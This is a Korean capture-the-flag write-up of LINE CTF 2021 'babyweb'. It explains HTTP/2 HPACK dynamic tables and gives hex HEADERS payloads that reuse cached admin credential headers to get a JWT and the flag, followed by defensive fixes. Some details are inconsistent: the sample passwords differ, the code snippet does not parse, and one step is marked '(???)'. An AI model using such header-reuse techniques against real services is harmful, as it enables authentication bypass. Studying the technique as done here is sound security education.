---
title: ["[LINE CTF 2021- web] babyweb"]
date: 2025-11-28 09:00:00 +0900
last_modified_at: 2025-11-28 09:00:00 +0900
categories: [writeup, ctf]
tags: [web, http2, hpack, jwt]
---

## HPACK과 Dynamic Table
### HTTP/2와 HPACK의 등장 배경
HTTP/1.1에서는 매 요청마다 헤더가 평문으로 반복 전송된다.  
거의 동일한 헤더가 매번 몇백 바이트씩 전송되는 것은 심각한 대역폭 낭비이므로,  
HTTP/2는 HPACK (Header Compression for HTTP/2, [RFC 7541](https://datatracker.ietf.org/doc/html/rfc7541))을 도입하여 헤더를 압축했다.  

### HPACK 구성 요소
#### 1. Static Table
자주 사용되는 61개 헤더가 미리 정의되어 있다.  

| Index | Header Name      | Header Value |
| ----- | ---------------- | ------------ |
| 1     | :authority       | (empty)      |
| 2     | :method          | GET          |
| 3     | :method          | POST         |
| 4     | :path            | /            |
| 5     | :path            | /index.html  |
| 6     | :scheme          | http         |
| 7     | :scheme          | https        |
| 8     | :status          | 200          |
| ...   | ...              | ...          |
| 32    | cookie           | (empty)      |
| ...   | ...              | ...          |
| 61    | www-authenticate | (empty)      |


**사용 예시:**
```
0x82 = 1000 0010 = Indexed representation, index 2
     → :method: GET (단 1바이트로 표현 가능)

0x87 = 1000 0111 = Indexed representation, index 7  
     → :scheme: https
```

#### 2. Dynamic Table
**connection마다 유지되는 FIFO 테이블**로, 새로운 헤더가 추가되면 인덱스 62부터 시작한다.  
```
┌─────────────────────────────────────────────────────┐
│                   Dynamic Table                     │
├─────────┬───────────────────┬───────────────────────┤
│  Index  │    Header Name    │     Header Value      │
├─────────┼───────────────────┼───────────────────────┤
│   62    │ x-pass-uuid       │ admin_password_123    │  ← 가장 최근
│   63    │ x-user-uuid       │ admin                 │
│   64    │ :path             │ /auth                 │
│   65    │ :authority        │ internal-server:443   │
│   66    │ :path             │ /health               │  ← 가장 오래됨
└─────────┴───────────────────┴───────────────────────┘
          ↑ 새 항목은 위에 추가, 오래된 항목은 아래로 밀림
```

- 같은 HTTP/2 connection 내에서만 유지된다.
- 클라이언트와 서버가 동일한 테이블 상태를 공유한다.

### HPACK 인코딩 방식
#### Indexed Header Field
```
  0   1   2   3   4   5   6   7
+---+---+---+---+---+---+---+---+
| 1 |        Index (7+)         |
+---+---------------------------+
```

- 최상위 비트가 1이면 인덱스 참조
- 나머지 7비트로 인덱스 표현 (7비트 초과시 multi-byte)

**예시:**
```
0x82 = 1000 0010 = index 2 → :method: GET
0xbe = 1011 1110 = index 62 → Dynamic Table 첫 번째 항목
0xc0 = 1100 0000 = index 64 → Dynamic Table 세 번째 항목
```

#### Literal Header Field with Incremental Indexing
```
  0   1   2   3   4   5   6   7
+---+---+---+---+---+---+---+---+
| 0 | 1 |      Index (6+)       |  ← 이름은 인덱스로, 값은 리터럴
+---+---+-----------------------+
| H |     Value Length (7+)     |
+---+---------------------------+
| Value String (Length octets)  |
+-------------------------------+
```

**예시 - `:path: /flag` 인코딩:**
```
0x44 = 0100 0100 = Incremental indexing, name index 4 (:path)
0x05 = Value length 5
"/flag" = 2f 66 6c 61 67

결과: 44 05 2f 66 6c 61 67
```

#### Literal Header Field without Indexing
```
  0   1   2   3   4   5   6   7
+---+---+---+---+---+---+---+---+
| 0 | 0 | 0 | 0 |  Index (4+)   |  ← Index=0이면 새 이름
+---+---+-----------------------+
| H |     Name Length (7+)      |
+---+---------------------------+
|  Name String (Length octets)  |
+---+---------------------------+
| H |     Value Length (7+)     |
+---+---------------------------+
| Value String (Length octets)  |
+-------------------------------+
```

**예시 - `x-token: eyJ...` 인코딩:**
```
0x00 = 새 헤더 이름 (인덱스 없음)
0x07 = 이름 길이 7
"x-token" = 78 2d 74 6f 6b 65 6e
0x7f 0x12 = 값 길이 145 (127 + 18, multi-byte 인코딩)
"eyJ..." = JWT 토큰 바이트들
```

#### Multi-byte Integer 인코딩

7비트(또는 prefix 비트)로 표현할 수 없는 큰 숫자의 인코딩:
```
값 145를 7비트 prefix로 인코딩:
1. max_prefix = 2^7 - 1 = 127
2. 145 > 127이므로 multi-byte 필요
3. 첫 바이트: 0x7f (127)
4. 남은 값: 145 - 127 = 18
5. 두 번째 바이트: 0x12 (18)

결과: 0x7f 0x12
```


## 문제 분석
### 아키텍처 구조
```
[Client] → [Apache httpd (Proxy)] → [Flask Public Server] → [Node.js Internal Server]
                                          ↓
                                    HTTP/2 (hyper)
```

### 주요 파일 분석
**public/src/internal.py**
```python
@internal_bp.route("/health", methods=["POST"])
def health():
    data = request.get_json()
    
    if "type" in data.keys():
        elif data["type"] == "2":
            conn = create_connection()                      # 1. HTTP/2 connection 생성 
            conn.request("GET", "/health")                  # 2. ./health 요청
            resp = conn.get_response()                      #    -> Dynamic Table에 헤더 저장

            headers = {
                cfg["HEADER"]["USERNAME"]: cfg["ADMIN"]["USERNAME"],    # x-user-uuid: admin
                cfg["HEADER"]["PASSWORD"]: cfg["ADMIN"]["PASSWORD"]     # x-pass-uuid: secret
            }
            conn.request("GET", "/auth", headers=headers)   # 3. /auth 요청 (admin 인증정보)
            resp = conn.get_response()                      #    -> Dynamic Table에 admin 헤더 저장

            conn._new_stream()
            conn._send_cb(data["data"].encode('latin-1'))   # 사용자 입력을 RAW 프레임으로 전송
            conn._sock.fill()
            return conn._sock.buffer.tobytes()
```

**Step 2 후 (`/health` 요청):**
```
Dynamic Table:
┌───────┬─────────────┬─────────────────────┐
│ Index │ Name        │ Value               │
├───────┼─────────────┼─────────────────────┤
│  62   │ :path       │ /health             │
│  63   │ :authority  │ internal-server:443 │
└───────┴─────────────┴─────────────────────┘
```


**Step 3 후 (`/auth` 요청 with admin headers):**
```
Dynamic Table:
┌───────┬───────────────┬─────────────────────┐
│ Index │ Name          │ Value               │
├───────┼───────────────┼─────────────────────┤
│  62   │ x-pass-uuid   │ s3cr3t_p4ssw0rd     │  ← 민감 정보!
│  63   │ x-user-uuid   │ admin               │  ← 민감 정보!
│  64   │ :path         │ /auth               │
│  65   │ :authority    │ internal-server:443 │
│  66   │ :path         │ /health             │
└───────┴───────────────┴─────────────────────┘

**internal/src/router.js**
```javascript
const getFlag = (req, res)=>{
    let token = req.headers['x-token']
    if(checkToken(token)) {
        res.end(JSON.stringify({'result': true, 'flag': CONFIG.flag }))
    } else {
        res.end(JSON.stringify({'result': false}))
    }
}
```

### 취약점 개요
HTTP/2의 HPACK 압축은 Dynamic Table을 사용하여 이전에 전송된 헤더를 인덱스로 참조할 수 있다.  
`/internal/health` 엔드포엔트에서:  
1. `/health` 요청 -> 헤더들이 Dynamic Table에 저장
2. `/auth` 요청 (admin 자격증명 포함) -> admin 헤더들도 Dynamic Table에 저장
3. `_send_cb()`로 사용자 데이터를 raw HTTP/2 프레임으로 전송

3번에서 직접 구성한 HTTP/2 프레임을 보낼 수 있고, Dynamic Table에 저장된 admin 헤더를 인덱스를 참조할 수 있다.  

### 취약점 구성
```python
conn._send_cb(data["data"].encode('latin-1'))
```

`_send_cb()` 함수는 사용자의 raw 바이트를 그대로 HTTP/2 프레임으로 전송한다.  
공격자는  
1. Dynamic Table의 인덱스를 알고 있고,
2. 유효한 HTTP/2 HEADERS 프레임을 구성할 수 있고,
3. 민감한 헤더를 인덱스를 참조하여 재사용 할 수 있다.  

#### Stage 1 Exploit: Admin 인증 재사용
```
공격자가 전송하는 HPACK 데이터:
82 87 c2 c0 bf be

해석:
82 → :method: GET (Static Table index 2)
87 → :scheme: https (Static Table index 7)
c2 → Dynamic Table index 66... (???)

실제 인덱스 계산:
0xc2 = 1100 0010 = 최상위 비트 1 (indexed) + 나머지 66
하지만 HPACK에서 0xc0 이상은 다르게 해석됨

정확한 해석:
0xbe = index 62 → x-pass-uuid: s3cr3t_p4ssw0rd
0xbf = index 63 → x-user-uuid: admin  
0xc0 = index 64 → :path: /auth
0xc2 = index 66 → :authority: internal-server

결과: admin 인증정보로 /auth 재요청!

서버 응답:
{"result":true,"token":"eyJhbGciOiJIUzI1NiIs..."}
```

#### Stage 2 Exploit: Flag 획득
획득한 JWT로 `/flag` 엔드포인트 요청:  
```
HPACK 구성:
82          → :method: GET
87          → :scheme: https
c2          → :authority (Dynamic Table에서 재사용)
44 05 "/flag" → :path: /flag (리터럴)
00 07 "x-token" 7f 12 "eyJ..." → x-token: JWT (리터럴)
```

## 방어 방법
이런 프로토콜 레벨 인증 우회는, SQLI와 같은 일반적인 웹 취약점과 달리, 프로토콜 자체의 취약점을 이용하기 때문에 애플리케이션 레벨 보안으로 탐지하기 어렵다.  

### 1. Raw 프레임 전송 금지
```python
# 취약한 코드
conn._send_cb(data["data"].encode('latin-1'))

# 안전한 코드 - 정상 API 사용
conn.request("GET", "/flag", headers={"x-token": validated_token})
```

### 2. connection 분리
민감한 요청은 별도의 HTTP/2 connection에서 수행
```python
# 사용자 요청용 connection
user_conn = create_connection()

# 내부 인증용 connection (별도)
admin_conn = create_connection()
admin_conn.request("GET", "/auth", headers=admin_headers)
```

